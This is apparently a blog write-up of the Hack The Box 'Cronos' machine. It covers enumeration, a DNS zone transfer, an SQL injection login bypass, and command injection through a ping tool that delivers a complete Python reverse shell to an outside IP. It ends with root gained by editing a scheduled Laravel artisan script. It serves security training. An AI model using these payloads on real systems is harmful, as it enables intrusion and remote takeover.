---
title: "Cronos"
description: "Writeup for Cronos machine from HTB"
date: 2020-09-05
lastmod: 2020-09-05
author: "Pablo Jesús González Rubio"
cover: "cronos.png"
coverAlt: "Cronos icon"
toc: true
tags: [ "Writeup" ]
---

> `fast-nmap` and `gobusterdefault` are aliases from [this gist](https://gist.github.com/n0nuser/34fc14a084436ae89c2b3405ad453f0a)

## Scanning

I've put the machine IP in `/etc/hosts` for easy access:

```
10.10.10.13 cronos.htb
```

Then I've run my alias for nmap:

```
fast-nmap cronos.htb
```

Output:

```
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 18:b9:73:82:6f:26:c7:78:8f:1b:39:88:d8:02:ce:e8 (RSA)
|   256 1a:e6:06:a6:05:0b:bb:41:92:b0:28:bf:7f:e5:96:3b (ECDSA)
|_  256 1a:0e:e7:ba:00:cc:02:01:04:cd:a3:a9:3f:5e:22:20 (ED25519)
53/tcp open  domain  ISC BIND 9.10.3-P4 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.10.3-P4-Ubuntu
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Cronos
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Enumeration

We have HTTP port open:

{{< img "laravel.png" "Laravel" "border" >}}

We can look for hidden directories with Gobuster:

```
gobuster-default cronos.htb
```

Output:

```
/index.php (Status: 200)
/icons/ (Status: 403)
/css/ (Status: 200)
/js/ (Status: 200)
/server-status/ (Status: 403)
```

DNS port is also open, which means we might have some subdomain behind the initial webpage. We can do a Domain Transfer to list all of the subdomains it might have:

```
dig axfr @10.10.10.13 cronos.htb
```

Output:

```
; <<>> DiG 9.16.4-Debian <<>> axfr @10.10.10.13 cronos.htb
; (1 server found)
;; global options: +cmd
cronos.htb.		604800	IN	SOA	cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
cronos.htb.		604800	IN	NS	ns1.cronos.htb.
cronos.htb.		604800	IN	A	10.10.10.13
admin.cronos.htb.	604800	IN	A	10.10.10.13
ns1.cronos.htb.		604800	IN	A	10.10.10.13
www.cronos.htb.		604800	IN	A	10.10.10.13
cronos.htb.		604800	IN	SOA	cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
;; Query time: 47 msec
;; SERVER: 10.10.10.13#53(10.10.10.13)
;; WHEN: sáb sep 05 12:07:56 CEST 2020
;; XFR size: 7 records (messages 1, bytes 203)
```

It seems to be an admin subdomain, let's add it to `/etc/hosts`.

{{< img "admin.png" "Admin" "border" >}}

**Gobuster** on subdomain:

```
gobusterdefault admin.cronos.htb
```

Output:

```
/index.php (Status: 200)
/icons/ (Status: 403)
/welcome.php (Status: 200)
/logout.php (Status: 200)
/config.php (Status: 200)
/session.php (Status: 200)
/server-status/ (Status: 403)
```

Trying to log in with the SQLi:

```sql
admin' or '1'='1
```

> Full list with SQLI references [here](https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/).

That let us login into what seems a traceroute tool:

{{< img "nettool.png" "NetTool" "border" >}}

Bash commands can continue in the same line if they are interrupted by a `;`, it's pretty much a breakline. This happens in other languages such as C or Python.

So if the ping tool is usually performed like this:

```
ping 8.8.8.8
```

We can trick the webpage tool to execute our reverse shell:

```
ping 8.8.8.8; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

And with netcat listening at port 4444, we have a shell!

```
nc -lnvp 4444
```

{{< img "wwwdata.png" "WWW-Data" "border" >}}

`/home/noulis/user.txt` has read access, so we can read it even not being him.

## Privilege Escalation

I uploaded [`linpeas`](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) to look for any Privilege Escalation patterns.

We saw before the platform was very enthusiastic about [Laravel](https://forge.laravel.com/) and there's this odd service running:

{{< img "service.png" "Service" "border" >}}

We look for what the file `artisan` is and it's a PHP script that's running on schedule:

{{< img "artisan.png" "Artisan" "border" >}}

So we just have to modify it with the Pentest Monkey PHP reverse shell pointing at us:

{{< img "reverse.png" "PHP Reverse Shell" "border" >}}

And listening with netcat...

{{< img "root.png" "Root!" "border" >}}

Voilá! We are root 😁
